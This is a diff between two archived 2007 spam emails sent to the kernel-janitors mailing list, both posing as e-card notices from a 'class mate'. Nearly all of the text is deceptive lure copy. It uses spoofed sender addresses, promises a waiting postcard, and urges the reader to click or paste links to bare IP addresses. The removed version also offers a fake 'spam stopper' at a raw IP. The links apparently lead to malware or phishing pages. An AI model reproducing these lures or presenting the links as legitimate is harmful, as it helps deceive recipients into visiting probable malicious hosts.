@@ -1,54 +1,50 @@
-From: "GreetingCards.Com" <rtdt@wideopenwest.com>
-Date: Sun, 01 Jul 2007 16:46:35 +0000
-Subject: [KJ] You've received a postcard from a class mate!
-Message-Id: <002701c7bcc9$0c5c9170$3fb26974@bi.bswrh>
+From: "riversongs.com" <ryaay@statefarm.com>
+Date: Sat, 07 Jul 2007 05:34:57 +0000
+Subject: [KJ] You've received a postcard from a Class-mate!
+Message-Id: <002401c7c058$8e36f590$773c593d@joojn.tebr>
 List-Id: <kernel-janitors.vger.kernel.org>
+References: <002701c7bcc9$0c5c9170$3fb26974@bi.bswrh>
+In-Reply-To: <002701c7bcc9$0c5c9170$3fb26974@bi.bswrh>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: kernel-janitors@vger.kernel.org
 
-STOP GETTING SPAM
-Free OneClick spam stopper can be found at:
-81.95.149.27/logo/
+Hi. Class-mate has sent you a postcard.
+See your card as often as you wish during the next 15 days.
+
+SEEING YOUR CARD
+
+If your email software creates links to Web pages, click on your 
+card's direct www address below while you are connected to the Internet:
+
+http://68.58.3.8/?33d5eb0269ad4eac804814655dc21c83715e
+
+Or copy and paste it into your browser's "Location" box (where Internet 
+addresses go).
+     
 
 
-Good day.
+PRIVACY
+riversongs.com honors your privacy. Our home page and Card Pick Up have links to our 
+Privacy Policy.
 
-Your class mate has sent you a postcard from GreetingCards.Com.
+TERMS OF USE
+By accessing your card you agree we have no liability. 
+If you don't know the person sending the card or don't wish to see the card, 
+please disregard this Announcement.
 
-Send free ecards from GreetingCards.Com with your choice of colors, words and music.
+We hope you enjoy your awesome card.
 
-Your ecard will be available with us for the next 30 days. If you wish to keep 
-the ecard longer, you may save it on your computer or take a print.
-
-To view your ecard, choose from any of the following options:
-
---------
-OPTION 1
---------
-
-Click on the following Internet address or
-copy & paste it into your browser's address box.
-
-http://91.138.118.182/?955ab65e8517a32e6b9ea6878
-
---------
-OPTION 2
---------
-
-Copy & paste the ecard number in the "View Your Card" box at 
-http://91.138.118.182/
-
-Your ecard number is
-955ab65e8517a32e6b9ea6878
-
-Best wishes,
-Mailer-Daemon,
-GreetingCards.Com
-
+Wishing you the best,
+Administrator,
+riversongs.com
 
 _______________________________________________
+REMINDER: this mailing list moved to vger.kernel.org and current one will be discontinued soon.
+To resubscribe, send email to majordomo@vger.kernel.org with
+&quot;subscribe kernel-janitors&quot; in message body and follow instructions.
+
 Kernel-janitors mailing list
 Kernel-janitors@lists.linux-foundation.org
 https://lists.linux-foundation.org/mailman/listinfo/kernel-janitors
